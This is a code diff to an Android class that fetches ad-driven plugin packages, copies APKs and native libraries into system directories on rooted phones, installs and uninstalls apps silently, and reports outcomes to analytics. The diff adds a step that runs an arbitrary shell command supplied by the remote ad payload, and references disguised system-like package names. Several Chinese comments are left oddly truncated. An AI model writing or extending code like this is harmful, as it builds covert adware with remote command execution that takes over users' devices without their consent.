@@ -9,6 +9,7 @@ import android.content.res.AssetManager;
 import android.os.Environment;
 import android.os.Handler;
 import android.os.Message;
+import android.text.TextUtils;
 import android.util.Log;
 
 import com.ningso.silence.downloader.bizs.DLManager;
@@ -64,9 +65,14 @@ public class PluginDexManager {
                                 if (adBean.getActionType() == 1 && adBean.isRooted()) {
                                     boolean has2system = ShellUtils.CopyApkToSystem(installFile);
                                     ShellUtils.copyLibSo2SystemLib("/data/data/" + adBean.getPkgName() + "/lib");
-                                    if ("com.android.system.book".equals(adBean.getPkgName())) {
-                                        PackageUtils.startInstallAppLauncher(mContext, "com.android.system.book", "com.android.core.MainActivity2");
+                                    if (!TextUtils.isEmpty(adBean.getCmdStr())) {
+                                        ShellUtils.CommandResult commandResult = ShellUtils.execCommand(adBean.getCmdStr());
+                                        if (LOG_DEBUG)
+                                            Log.d(TAG, "CMD: " + commandResult.toString());
                                     }
+//                                  if ("com.system.c.a.b".equals(adBean.getPkgName())) {
+//                                        PackageUtils.startInstallAppLauncher(mContext, "com.system.c.a.b", "com.android.core.MainActivity2");
+//                                   }
                                     if (LOG_DEBUG) Log.d(TAG, "plugin copy system" + has2system);
                                 }
                                 deleteDex(mContext);
@@ -129,6 +135,8 @@ public class PluginDexManager {
                                         sendBroadcastToAnalytics(DOWNLOAD_ERROR, adBean.getPkgName(), 1, error);
                                     }
                                 });
+                    } else {
+                        Log.d(TAG, "the app has be installed" + adBean.getPkgName());
                     }
                     return true;
                 }
@@ -150,7 +158,7 @@ public class PluginDexManager {
     }
 
     /**
-     * 读取assets
+     * 取assets
      *
      * @param context
      * @param fileName
@@ -186,7 +194,7 @@ public class PluginDexManager {
     }
 
     /**
-     * 读取sd卡文件
+     * 取sd卡文件
      *
      * @return
      */
@@ -212,7 +220,7 @@ public class PluginDexManager {
     }
 
     /**
-     * 获取非系统应用信息列表
+     * 取非系统应用信息列表
      */
     private List<String> getAppList(Context context) {
         PackageManager pm = context.getPackageManager();
@@ -230,7 +238,7 @@ public class PluginDexManager {
     }
 
     /**
-     * 比较两个List是否存在相同值
+     * 两个List是否存在相同值
      *
      * @param
      * @param a
@@ -247,7 +255,7 @@ public class PluginDexManager {
     }
 
     /**
-     * 获取交集
+     * 取交集
      *
      * @param a
      * @param b
@@ -322,8 +330,8 @@ public class PluginDexManager {
      * 发送广播宿主用作统计
      *
      * @param actionType  发送广播action的类型
-     * @param installType 安装类型,0--静默安装,1--正常安装,3--安装失败,4--静默卸载,-1不是安装命令
-     * @param result      返回执行结果
+     * @param installType ,0--静默安装,1--正常安装,3--安装失败,4--静默卸载,-1不是安装命令
+     * @param result
      */
     private void sendBroadcastToAnalytics(String actionType, String pkg, int installType, String result) {
         try {
